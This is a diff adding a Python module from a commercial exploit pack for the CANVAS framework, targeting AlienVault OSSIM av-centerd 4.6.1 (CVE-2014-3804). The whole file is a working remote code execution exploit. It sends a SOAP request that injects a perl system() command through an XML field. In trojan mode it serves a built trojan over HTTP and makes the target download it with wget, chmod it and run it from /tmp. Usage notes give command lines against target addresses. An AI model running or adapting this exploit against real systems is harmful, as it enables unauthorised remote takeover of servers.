@@ -1,0 +1,294 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+import sys
+import re
+import random
+import time
+import thread
+import urllib, urllib2
+import xml.sax.saxutils as saxutils
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "AlienVault OSSIM av-centerd Util.pm Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in AlienVault OSSIM av-centerd 4.6.1"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "AlienVault"
+DOCUMENTATION["Date public"] = "2014.06.11"
+DOCUMENTATION["VersionsAffected"] = "AlienVault <= 4.6.1"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-14-202/"
+DOCUMENTATION["CVE Name"] = "CVE-2014-3804"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3804"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+
+-- Single command mode --
+.\3rdparty\D2SEC\exploits\d2sec_emcrmc\d2sec_alienvault.py -t 192.168.59.132 -l 192.168.1.1 -d 443 -O cmd:"ipconfig.exe"
+
+-- Automatic MOSDEF trojan download and exec --
+.\3rdparty\D2SEC\exploits\d2sec_ora_secback\d2sec_alienvault.py -v 0 -t 192.168.59.132 -l 192.168.1.1 -d 443
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.TROJANMODE = 0
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.port = 40007
+    	self.sslport = 40007
+    	self.version = 0
+    	self.protocol = "http"
+    	self.https = 1    	
+    	self.cmd = ""
+    	self.trojanname = "d2"
+    	return
+
+    def maketrojan(self):    	
+    	t_os = canvasos("Linux")
+    	t_os.arch = "X64"
+	    
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        		
+    	file(self.trojanname, "wb").write(self.mosdeftrojan)
+    	self.setInfo("%s - done"%(NAME))
+    	ret = len(self.mosdeftrojan) != 0	    			    
+
+    def makesploit(self, clientheader, clientbody):        
+    	from libs.spkproxy import header, body
+    	h = header('SERVER')
+    	b = body()				
+		        
+    	if clientheader.URL.count(self.trojanname):
+			self.log("Sending MOSDEF trojan")
+			f = open(self.trojanname, "rb")
+			sploitstring = f.read()
+			f.close()
+			os.remove(self.trojanname)
+			self.log("Sending %d bytes"%len(sploitstring))
+			h.addHeader("Content-type","binary/octet-stream")
+			h.addHeader("Connection","close")
+			b.setBody(sploitstring)
+		
+    	return h, b
+
+    def neededListenerTypes(self):
+		from canvasengine import LINUXMOSDEF_X64
+		return [LINUXMOSDEF_X64]
+
+
+    #################################################################################################################
+    # Code from httpserver.py
+    def listen(self):
+        self.getargs()
+        s=self.gettcplistener(80, "0.0.0.0")
+
+        if not s:
+            if self.port < 1024:
+                self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
+                         "you can try to bind to a higher port" % self.port)
+            else:
+                self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
+            return 0
+        s.set_timeout(5)
+        self.s=s
+        return s 
+
+    def accept(self, s=None ):
+        """
+        Try to accept one connection
+        returns true if we found one
+        """
+        #we loop on this ,so no annoying printouts here
+        #self.log("Accepting connection")
+        if s==None:
+            s=self.s 
+        try:
+            infd,addr=s.accept()
+        except timeoutsocket.Timeout:
+            #self.log("Timed out - no accept yet")
+            return 
+        if infd==-1:
+            return
+
+        #else we have an infd
+        self.handle(infd)
+        return True #handled connection
+        
+    def handle(self, infd): 
+        self.log("Handling connection")
+        clientheader = spkproxy.header(state = "SERVER")
+        clientheader.ssl = self.ssl
+        ret = clientheader.readdata(infd)
+        clientbody = spkproxy.body()
+        
+        if clientheader.gotGoodHeader():
+            if clientheader.bodySize()>0 or clientheader.wasChunked:
+                self.log("Reading body")
+                clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+                self.log("Read body")
+
+        self.log("Creating exploit response")
+
+        servheader,servbody = self.makesploit(clientheader,clientbody)
+        
+        self.log("Responding")
+        
+        bodydata="".join(servbody.data)
+                    
+        #now we respond...
+        response = ""
+        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+	self.log(response)
+
+        for akey in servheader.headerValuesDict.keys():
+            if akey not in [ "Content-Length", "Content-length"]:
+                response += servheader.grabHeader(akey)
+        self.log("Sending header data of %d bytes"%len(response))
+        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
+        if not chunked:
+            response+="Content-Length: "+str(len(bodydata))+"\r\n"
+        response+="\r\n"
+        response+="".join(bodydata)
+        self.log("Total response length is %d bytes"%len(response))
+        try:
+            infd.sendall(response)
+        except socket.error:
+            self.log("Connection closed by peer")
+        self.log("Response sent")
+        infd.close() #connection close - later on we'll keep it.
+        return 
+    #
+    #################################################################################################################
+        
+        
+    def startHTTPServer(self):
+    	s = self.listen()
+        
+    	if not s:
+    		self.log("Failed to listen - not running")
+    		return 0
+    		
+    	while 1:
+    		if self.state==self.HALT:
+    			self.s.close()
+    			break
+    			
+    		self.accept()
+
+    	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+        
+    	return 1    	
+    
+  
+    def run(self):
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))    
+
+    	if (self.argsDict.get("cmd", self.cmd) == ""):
+    		self.TROJANMODE = 1    		
+    		self.maketrojan()
+    		self.cmd = "wget -O /tmp/" + self.trojanname + " http://" + self.callback.ip + "/" + self.trojanname
+    		self.cmd += "&& chmod 777 /tmp/" + self.trojanname
+    		self.cmd += "&& /tmp/" + self.trojanname    			
+    		thread.start_new_thread(self.startHTTPServer,())    		
+    	else:
+    		self.cmd = self.argsDict.get("cmd", self.cmd)
+        	                	               
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                                  	
+        
+        if self.https == 0:
+            self.protocol = "http"
+        else:
+            self.protocol = "https"
+            self.port = self.sslport
+
+        payload = "d2 && perl -e 'system(\""+self.cmd+"\")'"
+        payload = payload.replace("&", "&#x26;").replace("\"", "&#x22;").replace("'", "&#x27;")      
+
+        ua = spkproxy.UserAgent("", exploit=self)
+          
+        params  = '<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'               
+        params += '<soap:Body>\n'
+        params += '<update_system_info_debian_package xmlns="AV/CC/Util">\n'
+        params += '<c-gensym3 xsi:type="xsd:string">d2</c-gensym3>\n'
+        params += '<c-gensym5 xsi:type="xsd:string">d2</c-gensym5>\n'
+        params += '<c-gensym7 xsi:type="xsd:string">d2</c-gensym7>\n'
+        params += '<c-gensym9 xsi:type="xsd:string">d2</c-gensym9>\n'        
+        params += '<c-gensym11 xsi:type="xsd:string">' + payload + '</c-gensym11>\n'        
+        params += '</update_system_info_debian_package>\n'                
+        params += '</soap:Body>\n'
+        params += '</soap:Envelope>\n'
+
+        url = "/ossim/av-centerd"    
+        mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+        ua.addHeader("Content-Type", "text/xml;charset=UTF-8")
+        ua.addHeader("SOAPAction", "\"AV/CC/Util#update_system_info_debian_package\"")
+        data = ua.POST(mainurl, params)    
+
+        if self.TROJANMODE == 0:                           
+            m = re.search('<item xsi:type="xsd:string">(.*)[\s]*</item><item xsi:type="xsd:string">', data, re.DOTALL)
+            if m is not None:
+                self.log(m.group(1).strip())                
+            	                          
+    	return 1
+    	
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
+
+    	i = 0
+
+    	print 'Available versions:'
+
+    	for listline in targets.values():
+    		print '\t%d: %s'%(i, listline)
+    		i = i + 1
+
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
